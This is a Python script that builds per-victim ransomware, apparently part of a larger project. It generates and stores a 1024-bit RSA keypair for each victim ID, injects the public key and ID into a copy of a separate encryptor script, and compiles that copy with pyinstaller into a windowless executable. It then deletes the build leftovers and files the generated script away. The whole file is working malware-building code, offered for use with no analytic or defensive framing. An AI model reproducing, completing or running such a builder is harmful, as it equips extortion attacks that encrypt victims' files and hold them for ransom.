import os
import rsa

global c
c = ''

def generateKeys():
    global c
    
    (publicKey, privateKey) = rsa.newkeys(1024)
    
    with open('counter.txt', 'r') as f:
        c = int(f.read())
    with open('counter.txt', 'w') as f:
        f.write(str(c+1))
        
    public = 'publicKeys/' + str(c+1) + '.pem'
    private = 'privateKeys/' + str(c+1) + '.pem'

    c = str(c+1)
    
    with open(public, 'wb') as f:
        f.write(publicKey.save_pkcs1('PEM'))
    with open(private, 'wb') as f:
        f.write(privateKey.save_pkcs1('PEM'))

def loadKeys():
    public = 'publicKeys/' + c + '.pem'
    private = 'privateKeys/' + c + '.pem'

    with open(public, 'rb') as f:
        publicKey = rsa.PublicKey.load_pkcs1(f.read())
    with open(private, 'rb') as f:
        privateKey = rsa.PrivateKey.load_pkcs1(f.read())
    return privateKey, publicKey

def createRansomeware():
    m_id = "m_id = '" + c + "'\n"
    pk = "publicKey = '" + str(publicKey) + "'\n"
        
    with open('encryptor.py', 'r') as f:
        l = f.read()

    py = 'e' + c + '.py'
    py_data = "global publicKey" + "\n" + m_id + pk + "\n" + l

    with open(py, 'w') as f:
        f.write(py_data)

generateKeys()
privateKey, publicKey = loadKeys()
createRansomeware()
createExe = "pyinstaller -F --noconsole e" + c + ".py"
spec = "del e" + c + ".spec"
os.system(createExe)
os.system("rmdir /s /q __pycache__")
os.system("rmdir /s /q build")
os.system(spec)
py = 'e' + c + '.py'
with open(py, 'r') as f:
    data = f.read()
npy = "encryptors/" + py
with open(npy, 'w') as f:
    f.write(data)
deletePy = "del " + py
os.system(deletePy)
